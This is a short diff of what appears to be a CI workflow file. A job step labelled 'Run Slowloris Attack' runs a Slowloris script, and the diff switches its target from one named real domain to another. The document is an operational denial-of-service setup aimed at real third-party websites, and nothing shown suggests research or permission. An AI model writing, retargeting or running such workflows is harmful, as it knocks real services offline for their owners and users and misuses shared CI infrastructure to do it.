@@ -20,4 +20,4 @@ jobs:
 
     - name: Run Slowloris Attack
       run: |
-        python3 slowloris.py gardeshgaranshiraz.com
+        python3 slowloris.py cloud4011.sadraidc.com
